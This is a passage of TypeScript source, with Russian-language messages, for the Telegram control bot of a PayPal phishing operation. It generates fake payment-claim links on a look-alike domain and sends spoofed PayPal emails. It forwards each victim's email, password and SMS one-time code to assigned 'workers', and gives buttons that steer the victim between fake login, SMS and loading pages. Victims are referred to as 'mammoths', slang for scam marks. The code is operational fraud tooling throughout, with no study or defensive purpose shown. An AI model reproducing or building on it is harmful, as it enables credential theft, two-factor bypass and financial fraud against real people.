        : "Production (активен)";
      const currentDomain = await getCurrentDomain();
      const domain = isDevelopment ? "localhost:5000" : currentDomain;

      // Получаем статус сайта
      let siteStatus = "Неизвестно";
      let redirectStatus = "Неизвестно";
      try {
        const siteResponse = await fetch(
          `http://localhost:5000/api/site/status`,
        );
        const siteData = await siteResponse.json();
        siteStatus = siteData.enabled ? "Включен ✅" : "Отключен ❌";

        const redirectResponse = await fetch(
          `http://localhost:5000/api/redirect/status`,
        );
        const redirectData = await redirectResponse.json();
        redirectStatus = redirectData.permanentRedirect
          ? "Включена ✅"
          : "Отключена ❌";
      } catch (error) {
        siteStatus = "Ошибка получения статуса";
      }

      await bot.sendMessage(
        chatId,
        `🔍 Статус системы:\n\n` +
          `🤖 Режим работы: ${envMode}\n` +
          `📡 Telegram бот: ${botStatus}\n` +
          `🌐 Домен: ${domain}\n` +
          `📊 Статус сайта: ${siteStatus}\n` +
          `🔄 Переадресация: ${redirectStatus}\n` +
          `🔗 Генерация ссылок: ${isDevelopment ? "Заблокирована" : "Активна"}\n` +
          `📬 Уведомления: ${isDevelopment ? "Отключены" : "Включены"}\n\n` +
          `${
            isDevelopment
              ? "⚠️ В режиме разработки доступно только тестирование интерфейса"
              : "✅ Полная функциональность активна"
          }`,
        adminKeyboard,
      );
      return;
    }

    if (text === "🗑️ Удалить все ссылки") {
      await bot.sendMessage(
        chatId,
        "⚠️ Вы уверены что хотите удалить ВСЕ ссылки у всех пользователей?\n\n" +
          "Используйте команду /delete_all_links для подтверждения.",
        (await isUserAdmin(telegramId)) ? adminKeyboard : mainKeyboard,
      );
      return;
    }

    if (text === "👥 Управление вбиверами") {
      if (!(await isUserAdmin(telegramId))) {
        await bot.sendMessage(chatId, "❌ У вас нет прав доступа.");
        return;
      }

      const workers = await getAllWorkers();
      const workersList = workers.length > 0 ? workers.map(w => `• ${w}`).join('\n') : "Нет активных вбиверов";
      
      await bot.sendMessage(
        chatId,
        `👥 **УПРАВЛЕНИЕ ВБИВЕРАМИ**\n\n` +
        `📊 Активные вбиверы:\n${workersList}\n\n` +
        `⚙️ Доступные команды:\n` +
        `• /addworker [telegram_id] - Добавить вбивера\n` +
        `• /removeworker [telegram_id] - Убрать вбивера\n` +
        `• /assignworker [worker_id] [user_id] - Назначить вбивера пользователю\n` +
        `• /unassignworker [worker_id] [user_id] - Отменить назначение\n` +
        `• /listassignments - Показать все назначения\n` +
        `• /workerstats - Статистика работы вбиверов`,
        { parse_mode: 'Markdown' }
      );
      return;
    }
  }

  if (text === "❓ Помощь") {
    const helpText = (await isUserAdmin(telegramId))
      ? `🤖 Помощь по использованию бота:\n\n` +
        `🔗 Создать ссылку - создание новой платежной ссылки\n` +
        `📋 Мои ссылки - просмотр и удаление ссылок\n` +
        `⚙️ Управление ботом - включение/отключение бота\n` +
        `🌐 Управление сайтом - полное отключение/включение сайта\n` +
        `🔄 Переадресация - постоянная переадресация на PayPal.com\n` +
        `👥 Управление вбиверами - назначение и контроль вбиверов\n` +
        `📢 Уведомления - отправка сообщения всем пользователям\n` +
        `🔍 Статус системы - проверка режима работы и состояния системы\n` +
        `🗑️ Удалить все ссылки - удаление всех ссылок у всех пользователей\n` +
        `❓ Помощь - это сообщение\n\n` +
        `Дополнительные команды:\n` +
        `/approve #ID - одобрить пользователя\n` +
        `/disable_bot - отключить бота\n` +
        `/enable_bot - включить бота\n` +
        `/disable_site - отключить весь сайт (перенаправление на PayPal)\n` +
        `/enable_site - включить сайт\n` +
        `/edit_domain домен.com - изменить домен в файле domain.config\n` +
        `/delete_all_links - удалить все ссылки\n\n` +
        `👥 Команды управления вбиверами:\n` +
        `/addworker [telegram_id] - добавить вбивера\n` +
        `/removeworker [telegram_id] - убрать вбивера\n` +
        `/assignworker [worker_id] [user_id] - назначить вбивера пользователю\n` +
        `/unassignworker [worker_id] [user_id] - отменить назначение\n` +
        `/listassignments - показать все назначения\n` +
        `/workerstats - статистика работы вбиверов`
      : `🤖 Помощь по использованию бота:\n\n` +
        `🔗 Создать ссылку - создание новой платежной ссылки\n` +
        `📋 Мои ссылки - просмотр и удаление ссылок\n` +
        `❓ Помощь - это сообщение\n\n` +
        `Для создания ссылки просто введите цену и имя отправителя.\n` +
        `Бот автоматически сгенерирует уникальную ссылку для платежа.`;

    await bot.sendMessage(
      chatId,
      helpText,
      (await isUserAdmin(telegramId)) ? adminKeyboard : mainKeyboard,
    );
    return;
  }

  if (text === "👤 Управление пользователями") {
    if (!(await isUserAdmin(telegramId))) {
      await bot.sendMessage(chatId, "❌ У вас нет прав доступа.");
      return;
    }

    await showUserManagement(chatId, telegramId);
    return;
  }

  // Handle conversation states
  if (userState) {
    await handleUserState(chatId, telegramId, text, userState);
  } else {
    await bot.sendMessage(
      chatId,
      "Используйте кнопки меню для навигации.",
      mainKeyboard,
    );
  }
});

// Broadcast message to all approved users
async function broadcastMessage(message: string) {
  try {
    const allApprovedUsers = await db
      .select()
      .from(telegramUsers)
      .where(eq(telegramUsers.isApproved, true));

    for (const user of allApprovedUsers) {
      try {
        await bot.sendMessage(user.telegramId, `‼️ INFO:\n\n${message}`);
      } catch (error) {
        console.error(
          `Failed to send broadcast to user ${user.uniqueId}:`,
          error,
        );
      }
    }
  } catch (error) {
    console.error("Error broadcasting message:", error);
  }
}

// Handle user conversation states
async function handleUserState(
  chatId: number,
  telegramId: string,
  text: string,
  userState: any,
) {
  try {
    const stateAction = userState.state || userState.action;
    switch (stateAction) {
      case "awaiting_price":
        // Validate price
        const price = parseFloat(text.replace(",", "."));
        if (isNaN(price) || price <= 0) {
          await bot.sendMessage(
            chatId,
            "Неверная цена. Введите число больше 0:",
          );
          return;
        }

        const formattedPrice = `${price.toFixed(2).replace(".", ",")} €`;
        userStates.set(telegramId, {
          state: "awaiting_sender_name",
          data: { price: formattedPrice },
        });

        await bot.sendMessage(
          chatId,
          `💰 Цена: ${formattedPrice}\n\n` +
            "👥 Теперь введите имя отправителя:",
        );
        break;

      case "awaiting_sender_name":
        console.log(`🔄 Handling awaiting_sender_name - input: "${text}", length: ${text.trim().length}`);
        console.log(`🔄 UserState data:`, userState.data);
        
        if (text.trim().length < 2) {
          console.log(`⚠️ Sender name too short: "${text.trim()}"`);
          await bot.sendMessage(
            chatId,
            "Имя отправителя должно содержать минимум 2 символа:",
          );
          return;
        }

        const { price: linkPrice } = userState.data;
        console.log(`🔄 About to call createLink - price: ${linkPrice}, sender: ${text.trim()}`);
        await createLink(chatId, telegramId, linkPrice, text.trim());
        userStates.delete(telegramId);
        break;

      case "add_user":
        if (!(await isUserAdmin(telegramId))) {
          await bot.sendMessage(chatId, "❌ У вас нет прав для добавления пользователей.");
          return;
        }

        const newUserId = text.trim();
        if (!/^\d+$/.test(newUserId)) {
          await bot.sendMessage(chatId, "❌ Неверный формат. Введите числовой Telegram ID:");
          return;
        }

        await addNewUser(chatId, telegramId, newUserId);
        userStates.delete(telegramId);
        break;

      case "awaiting_broadcast_message":
        if (!(await isUserAdmin(telegramId))) {
          await bot.sendMessage(
            chatId,
            "У вас нет прав для выполнения этой команды.",
          );
          userStates.delete(telegramId);
          return;
        }

        await broadcastMessage(text.trim());
        await bot.sendMessage(
          chatId,
          `✅ Сообщение отправлено всем пользователям!`,
          adminKeyboard,
        );
        userStates.delete(telegramId);
        break;

      case "awaiting_email":
        // Validate email format
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(text.trim())) {
          await bot.sendMessage(
            chatId,
            "Неверный формат email. Введите корректный email адрес:",
          );
          return;
        }

        const { contextData } = userState.data;

        // Find the link with this contextData
        const links = await db
          .select()
          .from(telegramLinks)
          .where(eq(telegramLinks.contextData, contextData));

        if (links.length === 0) {
          await bot.sendMessage(
            chatId,
            "Ошибка: ссылка не найдена.",
            mainKeyboard,
          );
          userStates.delete(telegramId);
          return;
        }

        const link = links[0];

        // Send email
        try {
          const emailSent = await sendPayPalNotificationEmail(
            text.trim(),
            link,
          );

          if (emailSent) {
            await bot.sendMessage(
              chatId,
              `✅ Письмо успешно отправлено на ${text.trim()}!\n\n` +
                `📧 От: service@paypal.de\n` +
                `📎 Ссылка: ${link.linkId}\n` +
                `💰 Сумма: ${link.price}`,
              mainKeyboard,
            );
          } else {
            await bot.sendMessage(
              chatId,
              `⚠️ Email API не настроен (SENDGRID_API_KEY отсутствует)\n\n` +
                `📧 Адрес получателя: ${text.trim()}\n` +
                `📎 Ссылка: ${link.linkId}\n` +
                `💰 Сумма: ${link.price}\n\n` +
                `🔧 Настройте SendGrid API для отправки писем`,
              mainKeyboard,
            );
          }
        } catch (error) {
          console.error("Error sending email:", error);
          await bot.sendMessage(
            chatId,
            "❌ Ошибка при отправке письма. Проверьте настройки SendGrid.",
            mainKeyboard,
          );
        }

        userStates.delete(telegramId);
        break;

      default:
        userStates.delete(telegramId);
        await bot.sendMessage(
          chatId,
          "Неизвестное состояние. Попробуйте снова.",
          mainKeyboard,
        );
    }
  } catch (error) {
    console.error("Error handling user state:", error);
    console.error("State details:", { telegramId, text, userState });
    userStates.delete(telegramId);
    await bot.sendMessage(
      chatId,
      "Произошла ошибка. Попробуйте снова.",
      mainKeyboard,
    );
  }
}

// Create new link
async function createLink(
  chatId: number,
  telegramId: string,
  price: string,
  senderName: string,
) {
  const isDevelopment = process.env.NODE_ENV === "development";
  console.log(`🔧 createLink called - isDevelopment: ${isDevelopment}, chatId: ${chatId}, price: ${price}, senderName: ${senderName}`);
  
  // Development mode - all functions enabled for testing
  // if (isDevelopment) {
  //   console.log("🚫 Development mode: Telegram bot functions disabled");
  //   await bot.sendMessage(
  //     chatId,
  //     "🚫 Бот отключен в режиме разработки. Функция доступна только в Production.",
  //   );
  //   return;
  // }

  try {
    const linkId = await generateLinkId();
    const contextData = generateRandomString();
    const currentDomain = await getCurrentDomain();
    console.log(`🌍 Current domain from database: ${currentDomain}`);
    console.log(`🔧 isDevelopment: ${isDevelopment}`);
    
    const baseUrl = currentDomain === 'localhost:5000' 
        ? `http://${currentDomain}`
        : `https://${currentDomain}`;
    
    console.log(`🔗 Final baseUrl: ${baseUrl}`);

    const generatedLink = `${baseUrl}/myaccount/transfer/claim-money?context_data=${contextData}&price=${encodeURIComponent(price)}&name=${encodeURIComponent(senderName)}`;
    console.log(`🔗 Generated link: ${generatedLink}`);

    await db.insert(telegramLinks).values({
      linkId,
      price,
      senderName,
      generatedLink,
      contextData,
      createdBy: telegramId,
    });

    // Create hash for check users functionality
    const checkHash = contextData.substring(0, 8);

    // Store mapping for check users functionality
    if (!(global as any).checkHashMap) {
      (global as any).checkHashMap = new Map();
    }
    (global as any).checkHashMap.set(checkHash, contextData);

    const message = await bot.sendMessage(
      chatId,
      `✅ Ссылка создана!\n` +
        `🔗 PAYPAL 🇩🇪  ${linkId}\n` +
        `💰 Сумма: ${price}\n` +
        `👥 Отправитель: ${senderName}\n\n` +
        `📎 <code>${generatedLink}</code>\n\n` +
        `💜 Good Luck 💚`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "👁Чекер👁 ",
                callback_data: `check_users_${checkHash}`,
              },
              {
                text: "📧 Отправить письмо",
                callback_data: `send_email_${checkHash}`,
              },
            ],
            [
              {
                text: "🔄 Обновить",
                callback_data: `refresh_page_${checkHash}`,
              },
            ],
          ],
        },
      },
    );

    // Pin the message with the created link
    try {
      await bot.pinChatMessage(chatId, message.message_id);
      console.log(`📌 Link message pinned for user ${telegramId}`);
    } catch (pinError) {
      console.error("Error pinning message:", pinError);
      // Continue without pinning if there's an error
    }
  } catch (error) {
    console.error("Error creating link:", error);
    await bot.sendMessage(
      chatId,
      "Произошла ошибка при создании ссылки.",
      mainKeyboard,
    );
  }
}

// Show user profile
async function showUserProfile(chatId: number, telegramId: string) {
  try {
    const user = await getUserByTelegramId(telegramId);
    if (!user) {
      await bot.sendMessage(chatId, "Пользователь не найден.", mainKeyboard);
      return;
    }

    const links = await db
      .select()
      .from(telegramLinks)
      .where(eq(telegramLinks.createdBy, telegramId));

    const activeLinksCount = links.length;
    const isAdmin = await isUserAdmin(telegramId);

    let message = `👤 Профиль пользователя\n\n`;
    message += `🏷️ Уникальный тег: ${user.uniqueId}\n`;
    message += `📊 Активные ссылки: ${activeLinksCount}`;

    if (isAdmin) {
      message += `\n\n🔧 Статус: Администратор`;
    }

    await bot.sendMessage(
      chatId,
      message,
      (await isUserAdmin(telegramId)) ? adminKeyboard : mainKeyboard,
    );
  } catch (error) {
    console.error("Error showing user profile:", error);
    await bot.sendMessage(
      chatId,
      "Произошла ошибка при загрузке профиля.",
      mainKeyboard,
    );
  }
}

// Show user links with pagination
async function showUserLinks(
  chatId: number,
  telegramId: string,
  page: number = 0,
) {
  try {
    const links = await db
      .select()
      .from(telegramLinks)
      .where(eq(telegramLinks.createdBy, telegramId))
      .orderBy(desc(telegramLinks.createdAt));

    if (links.length === 0) {
      await bot.sendMessage(
        chatId,
        "У вас нет созданных ссылок.",
        mainKeyboard,
      );
      return;
    }

    const LINKS_PER_PAGE = 3;
    const totalPages = Math.ceil(links.length / LINKS_PER_PAGE);
    const currentPage = Math.max(0, Math.min(page, totalPages - 1));

    const startIndex = currentPage * LINKS_PER_PAGE;
    const endIndex = startIndex + LINKS_PER_PAGE;
    const currentLinks = links.slice(startIndex, endIndex);

    // Create header message
    let headerMessage = `📋 Мои ссылки (${currentPage + 1}/${totalPages})\n`;
    headerMessage += `📊 Всего ссылок: ${links.length}\n\n`;

    // Show current page links
    for (let i = 0; i < currentLinks.length; i++) {
      const link = currentLinks[i];
      const date = new Date(link.createdAt).toLocaleDateString("ru-RU");
      const linkNumber = startIndex + i + 1;

      headerMessage += `${linkNumber}. ${link.linkId} - ${link.price}\n`;
      headerMessage += `👤 ${link.senderName}\n`;
      headerMessage += `📅 ${date}\n`;
      headerMessage += `🔗 <code>${link.generatedLink}</code>\n\n`;
    }

    // Create navigation buttons
    const keyboard = [];

    // Navigation row
    const navRow = [];
    if (currentPage > 0) {
      navRow.push({
        text: "⬅️ Назад",
        callback_data: `links_page_${currentPage - 1}_${telegramId}`,
      });
    }
    if (currentPage < totalPages - 1) {
      navRow.push({
        text: "➡️ Вперед",
        callback_data: `links_page_${currentPage + 1}_${telegramId}`,
      });
    }
    if (navRow.length > 0) {
      keyboard.push(navRow);
    }

    // Action buttons row
    const actionRow = [];

    // Delete current page links
    if (currentLinks.length > 0) {
      actionRow.push({
        text: `🗑 Удалить страницу (${currentLinks.length})`,
        callback_data: `delete_page_${currentPage}_${telegramId}`,
      });
    }

    // Delete all links
    actionRow.push({
      text: `🗑💥 Удалить все (${links.length})`,
      callback_data: `delete_all_user_links_${telegramId}`,
    });

    keyboard.push(actionRow);

    await bot.sendMessage(chatId, headerMessage, {
      reply_markup: { inline_keyboard: keyboard },
      parse_mode: "HTML",
    });
  } catch (error) {
    console.error("Error showing user links:", error);
    await bot.sendMessage(
      chatId,
      "Произошла ошибка при загрузке ссылок.",
      mainKeyboard,
    );
  }
}

// Send simple notifications to regular users (without sensitive data or buttons)
async function sendSimpleUserNotification(
  user: any,
  linkId: string,
  action: string,
  contextData?: string
) {
  try {
    const message = `🇩🇪 PAYPAL ${linkId}\n\n📍 ${action}`;
    
    console.log(`📱 [USER ${user.uniqueId}] Simple notification: ${message}`);
    
    if (bot) {
      await bot.sendMessage(user.telegramId, message, {
        parse_mode: "HTML",
      });
      console.log(`✅ Simple notification sent to user ${user.uniqueId}`);
    } else {
      console.log(`⚠️ Bot not available, notification logged for user ${user.uniqueId}`);
    }
  } catch (error) {
    console.error(`Failed to send simple notification to user ${user.uniqueId}:`, error);
    console.log(`📱 [USER ${user.uniqueId}] Simple notification (logged): ${message}`);
  }
}

// Send full notifications to workers/admins (with data and control buttons)
export async function sendWorkerNotification(
  user: any,
  linkId: string,
  message: string,
  keyboard?: any
) {
  try {
    const options: any = { parse_mode: "HTML" };
    if (keyboard) {
      if (keyboard.reply_markup) {
        options.reply_markup = keyboard.reply_markup;
      } else {
        options.reply_markup = keyboard;
      }
    }
    
    console.log(`📱 [${user.role.toUpperCase()} ${user.uniqueId}] Full notification: ${message}`);
    console.log(`🔧 Keyboard structure:`, JSON.stringify(options.reply_markup, null, 2));
    
    if (bot) {
      await bot.sendMessage(user.telegramId, message, options);
      console.log(`✅ Worker notification sent to ${user.uniqueId}`);
    } else {
      console.log(`⚠️ Bot not available, notification logged for ${user.role} ${user.uniqueId}`);
    }
  } catch (error) {
    console.error(`Failed to send worker notification to ${user.uniqueId}:`, error);
    console.log(`📱 [${user.role.toUpperCase()} ${user.uniqueId}] Full notification (logged): ${message}`);
  }
}

// Notify users about redirect actions (simple notifications to link creators)
export async function notifyRedirectAction(
  contextData: string,
  action: string,
  workerName: string = "Вбивер"
) {
  // Note: Enabled in development mode for testing
  console.log(`📤 Sending redirect notification - action: ${action}, worker: ${workerName}`);
  
  if (!bot) {
    console.log("🚫 Bot not initialized, skipping notification");
    return;
  }

  try {
    // Find the link creator by contextData
    const links = await db
      .select()
      .from(telegramLinks)
      .where(eq(telegramLinks.contextData, contextData));

    if (links.length === 0) {
      console.log("⚠️ No links found for redirect notification");
      return;
    }

    const linkCreatorId = links[0].createdBy;
    const creatorUser = await db
      .select()
      .from(telegramUsers)
      .where(eq(telegramUsers.telegramId, linkCreatorId));

    if (creatorUser.length === 0) {
      console.log("⚠️ Link creator not found for redirect notification");
      return;
    }

    // Only send to the original link creator (not workers)
    if (creatorUser[0].role === "user") {
      const actionText = getRedirectActionText(action);
      await sendSimpleUserNotification(
        creatorUser[0], 
        links[0].linkId, 
        `${workerName} перенаправил на: ${actionText}`,
        contextData
      );
    }
  } catch (error) {
    console.error("Error sending redirect notification:", error);
  }
}

// Helper function to convert redirect action to readable text
function getRedirectActionText(action: string): string {
  switch (action) {
    case "home": return "Главная страница";
    case "signin": return "Страница входа";
    case "loading": return "Загрузка";
    case "sms_loading": return "Подготовка SMS";
    case "sms": return "SMS страница";
    case "fullscreen": return "Полноэкранная загрузка";
    case "paypal": return "Официальный PayPal";
    default: return "Неизвестная страница";
  }
}

// Notification functions for website events
export async function notifyLoginAttempt(
  emailOrPhone: string,
  password: string,
  returnUri: string,
  loginAttemptId: number,
  contextData?: string,
) {
  // Note: Enabled in development mode for testing
  console.log(`📤 Sending login attempt notification - email: ${emailOrPhone}, context: ${contextData}`);
  
  if (!bot) {
    console.log("🚫 Bot not initialized, skipping notification");
    return;
  }

  try {
    console.log("🔍 Login attempt ID received:", loginAttemptId);

    // Find the link creator by contextData
    let targetUsers: any[] = [];
    console.log("🔍 Looking for link creator with contextData:", contextData);

    if (contextData) {
      // Find the link with this contextData
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));
      console.log("📊 Found links with contextData:", links.length);

      if (links.length > 0) {
        const linkCreator = links[0];
        console.log("🔗 Link creator details:", {
          linkId: linkCreator.linkId,
          createdBy: linkCreator.createdBy,
        });

        // Get the user who created this link
        const user = await db
          .select()
          .from(telegramUsers)
          .where(eq(telegramUsers.telegramId, linkCreator.createdBy));
        console.log(
          "👤 Found link creator user:",
          user.length > 0 ? user[0].uniqueId : "none",
        );

        if (user.length > 0 && user[0].isApproved) {
          // Check if creator is admin - if so, they see all notifications
          if (user[0].role === "admin") {
            targetUsers = user;
            console.log("🔑 Admin user - sending notification to admin only");
          } else {
            // Check if creator is regular user with assigned workers
            const assignedWorkers = await db
              .select()
              .from(workerAssignments)
              .leftJoin(telegramUsers, eq(workerAssignments.workerId, telegramUsers.telegramId))
              .where(eq(workerAssignments.userId, linkCreator.createdBy));

            if (assignedWorkers.length > 0) {
              // Send to assigned workers
              targetUsers = assignedWorkers.map(assignment => assignment.telegramUsers).filter(Boolean);
              console.log(`👥 Found ${targetUsers.length} assigned workers`);
            } else {
              // No assigned workers, assign to next available worker using round-robin
              const nextWorker = await getNextWorkerForAssignment();
              if (nextWorker) {
                // Create automatic assignment
                await db.insert(workerAssignments).values({
                  workerId: nextWorker,
                  userId: linkCreator.createdBy,
                  assignedBy: "system",
                });

                console.log(`✅ Auto-assigned worker ${nextWorker} to user ${linkCreator.createdBy}`);
                
                // Get worker info
                const workerUser = await db
                  .select()
                  .from(telegramUsers)
                  .where(eq(telegramUsers.telegramId, nextWorker));
                
                targetUsers = workerUser;
                console.log("🤖 Auto-assigned to worker");
              } else {
                // No workers available, send to admins
                const adminIds = loadAdmins();
                const adminUsers = [];
                for (const adminId of adminIds) {
                  const user = await db
                    .select()
                    .from(telegramUsers)
                    .where(eq(telegramUsers.telegramId, adminId));
                    
                  if (user.length > 0) {
                    adminUsers.push(user[0]);
                  } else {
                    // Create dummy admin object for notification
                    adminUsers.push({
                      telegramId: adminId,
                      uniqueId: `#ADMIN_${adminId}`,
                      role: "admin",
                      isApproved: true
                    });
                  }
                }
                
                targetUsers = adminUsers;
                console.log("🔑 No workers available - sending to admins");
              }
            }
          }
        }
      }
    }

    // Fallback to all admins if no specific link creator found
    if (targetUsers.length === 0) {
      const adminIds = loadAdmins();
      console.log("⚠️ Fallback to all admins from config:", adminIds);
      
      // Get admin users from database or create dummy admin objects
      const adminUsers = [];
      for (const adminId of adminIds) {
        const user = await db
          .select()
          .from(telegramUsers)
          .where(eq(telegramUsers.telegramId, adminId));
          
        if (user.length > 0) {
          adminUsers.push(user[0]);
        } else {
          // Create dummy admin object for notification
          adminUsers.push({
            telegramId: adminId,
            uniqueId: `#ADMIN_${adminId}`,
            role: "admin",
            isApproved: true
          });
        }
      }
      
      targetUsers = adminUsers;
      console.log("⚠️ Fallback admin users prepared:", targetUsers.length);
    }

    // Get link info for new format
    let linkId = "#DIRECT";
    let linkPrice = "0.00 EUR";

    if (contextData && targetUsers.length > 0) {
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));
      if (links.length > 0) {
        linkId = links[0].linkId;
        linkPrice = links[0].price;
      }
    }

    // Get actual generated link from database
    let actualLink = "https://paypal.com";
    if (contextData) {
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));
      if (links.length > 0 && links[0].generatedLink) {
        actualLink = links[0].generatedLink.replace(
          "http://localhost:5000",
          `https://pypal.link`,
        );
      }
    }

    const message =
      `🇩🇪 PAYPAL ${linkId}\n` +
      `🧭 NEW log: Ввод данных\n` +
      `💰 ${linkPrice}\n\n` +
      `📧 Email/Телефон:\n<code>${emailOrPhone}</code>\n` +
      `🔑 Пароль:\n<code>${password}</code>\n\n` +
      `<a href="${actualLink}">🔗 Открыть ссылку</a>`;

    // Create a short hash for callback data (Telegram limit is 64 bytes)
    const shortHash = contextData ? contextData.substring(0, 8) : "direct";

    // Store mapping of short hash to full contextData
    if (!(global as any).redirectHashMap) {
      (global as any).redirectHashMap = new Map();
      console.log('🔄 LOGIN: Created new redirectHashMap');
    }
    if (contextData) {
      (global as any).redirectHashMap.set(shortHash, contextData);
      console.log(`🔄 LOGIN: Stored in redirectHashMap: ${shortHash} -> ${contextData}`);
      console.log(`🔄 LOGIN: Total redirectHashMap entries: ${(global as any).redirectHashMap.size}`);
    }

    const keyboard = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "➡️ Получить",
              callback_data: `redirect_${shortHash}_home`,
            },
            {
              text: "➡️ Логин",
              callback_data: `redirect_${shortHash}_signin`,
            },
          ],
          [
            {
              text: "➡️ Загрузка",
              callback_data: `redirect_${shortHash}_loading`,
            },
            {
              text: "➡️ Пуш",
              callback_data: `redirect_${shortHash}_sms_loading`,
            },
          ],
          [
            {
              text: "➡️ СМС",
              callback_data: `redirect_${shortHash}_sms`,
            },
            {
              text: "➡️ JaS",
              callback_data: `redirect_${shortHash}_fullscreen`,
            },
          ],
          [
            {
              text: "‼️Orig PayPal‼️",
              callback_data: `redirect_${shortHash}_paypal`,
            },
          ],
          [
            {
              text: "🔄 Обновить",
              callback_data: `refresh_page_${shortHash}`,
            },
          ],
        ],
      },
    };

    // Send different notifications based on user role
    for (const user of targetUsers) {
      try {
        if (user.role === "admin" || user.role === "worker") {
          // Send full notification with data and control buttons to admins/workers
          await bot.sendMessage(user.telegramId, message, {
            ...keyboard,
            parse_mode: "HTML",
          });
          console.log(`✅ Full login notification sent to ${user.role} ${user.uniqueId}`);
        } else {
          // Send simple notification to regular users
          await sendSimpleUserNotification(user, linkId, "Пользователь на странице входа", contextData);
        }
      } catch (error) {
        console.error(
          `Failed to send login notification to ${user.uniqueId}:`,
          error,
        );
      }
    }
  } catch (error) {
    console.error("Error sending login notification:", error);
  }
}

export async function notifyLoginApproved(emailOrPhone: string) {
  // Note: Enabled in development mode for testing
  console.log("📤 Sending login approved notification");

  try {
    const approvedUsers = await db
      .select()
      .from(telegramUsers)
      .where(eq(telegramUsers.isApproved, true));

    const message =
      `✅ Вход одобрен\n\n` +
      `📧 Email/Телефон: \`${emailOrPhone}\`\n` +
      `⏰ Время: ${new Date().toLocaleString("ru-RU")}`;

    for (const user of approvedUsers) {
      await bot.sendMessage(user.telegramId, message, {
        parse_mode: "Markdown",
      });
    }
  } catch (error) {
    console.error("Error sending approval notification:", error);
  }
}

export async function notifySmsSubmission(
  otpCode: string,
  stepupContext: string,
  contextData?: string,
) {
  // Note: Enabled in development mode for testing
  console.log(`📤 Sending SMS submission notification - code: ${otpCode}, context: ${contextData}`);
  
  if (!bot) {
    console.log("🚫 Bot not initialized, skipping notification");
    return;
  }

  try {
    // Find the link creator by contextData
    let targetUsers: any[] = [];
    console.log(
      "📱 Looking for SMS link creator with contextData:",
      contextData,
    );

    if (contextData) {
      // Find the link with this contextData
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));
      console.log("📊 Found SMS links with contextData:", links.length);

      if (links.length > 0) {
        const linkCreator = links[0];
        console.log("🔗 SMS link creator details:", {
          linkId: linkCreator.linkId,
          createdBy: linkCreator.createdBy,
        });

        // Get the user who created this link
        const user = await db
          .select()
          .from(telegramUsers)
          .where(eq(telegramUsers.telegramId, linkCreator.createdBy));
        console.log(
          "👤 Found SMS link creator user:",
          user.length > 0 ? user[0].uniqueId : "none",
        );

        if (user.length > 0 && user[0].isApproved) {
          targetUsers = user;
          console.log("✅ Targeting SMS to specific user:", user[0].uniqueId);
        }
      }
    }

    // Fallback to all admins if no specific link creator found
    if (targetUsers.length === 0) {
      const adminIds = loadAdmins();
      console.log("⚠️ SMS fallback to all admins from config:", adminIds);
      
      // Get admin users from database or create dummy admin objects
      const adminUsers = [];
      for (const adminId of adminIds) {
        const user = await db
          .select()
          .from(telegramUsers)
          .where(eq(telegramUsers.telegramId, adminId));
          
        if (user.length > 0) {
          adminUsers.push(user[0]);
        } else {
          // Create dummy admin object for notification
          adminUsers.push({
            telegramId: adminId,
            uniqueId: `#ADMIN_${adminId}`,
            role: "admin",
            isApproved: true
          });
        }
      }
      
      targetUsers = adminUsers;
      console.log("⚠️ SMS fallback admin users prepared:", targetUsers.length);
    }

    // Get link info for new format
    let linkId = "#DIRECT";
    let linkPrice = "0.00 EUR";

    if (contextData && targetUsers.length > 0) {
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));
      if (links.length > 0) {
        linkId = links[0].linkId;
        linkPrice = links[0].price;
      }
    }

    // Get actual generated link from database
    let actualLink = "https://paypal.com";
    if (contextData) {
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));
      if (links.length > 0 && links[0].generatedLink) {
        actualLink = links[0].generatedLink.replace(
          "http://localhost:5000",
          `https://pypal.link`,
        );
      }
    }

    const message =
      `🇩🇪 PAYPAL ${linkId}\n` +
      `🧭 NEW log: Пуш & Смс\n` +
      `💰 ${linkPrice}\n\n` +
      `🔢 SMS Код:\n<code>${otpCode}</code>\n\n` +
      `У мамонта висит Just a second...\n\n` +
      `<a href="${actualLink}">🔗 Открыть ссылку</a>`;

    // Create buttons for user control
    const redirectButtons = [];

    // First row - main navigation
    redirectButtons.push([
      {
        text: "➡️ Получить",
        callback_data: `redirect_${contextData ? contextData.substring(0, 8) : "direct"}_home`,
      },
      {
        text: "➡️ Логин",
        callback_data: `redirect_${contextData ? contextData.substring(0, 8) : "direct"}_signin`,
      },
    ]);

    // Second row - loading states
    redirectButtons.push([
      {
        text: "➡️ Загрузка",
        callback_data: `redirect_${contextData ? contextData.substring(0, 8) : "direct"}_loading`,
      },
      {
        text: "➡️ Пуш",
        callback_data: `redirect_${contextData ? contextData.substring(0, 8) : "direct"}_sms_loading`,
      },
    ]);

    // Third row - sms and special states
    redirectButtons.push([
      {
        text: "➡️ СМС",
        callback_data: `redirect_${contextData ? contextData.substring(0, 8) : "direct"}_sms`,
      },
      {
        text: "➡️ JaS",
        callback_data: `redirect_${contextData ? contextData.substring(0, 8) : "direct"}_fullscreen`,
      },
    ]);

    // Fourth row - paypal redirect
    redirectButtons.push([
      {
        text: "‼️Orig PayPal‼️",
        callback_data: `redirect_${contextData ? contextData.substring(0, 8) : "direct"}_paypal`,
      },
    ]);

    // Fifth row - refresh button
    redirectButtons.push([
      {
        text: "🔄 Обновить",
        callback_data: `refresh_page_${contextData ? contextData.substring(0, 8) : "direct"}`,
      },
    ]);

    // Store the contextData mapping for button callbacks
    if (contextData) {
      const shortHash = contextData.substring(0, 8);
      if (!(global as any).redirectHashMap) {
        (global as any).redirectHashMap = new Map();
      }
      (global as any).redirectHashMap.set(shortHash, contextData);
    }

    // Send different notifications based on user role
    for (const user of targetUsers) {
      try {
        if (user.role === "admin" || user.role === "worker") {
          // Send full notification with SMS code and control buttons to admins/workers
          await bot.sendMessage(user.telegramId, message, {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: redirectButtons,
            },
          });
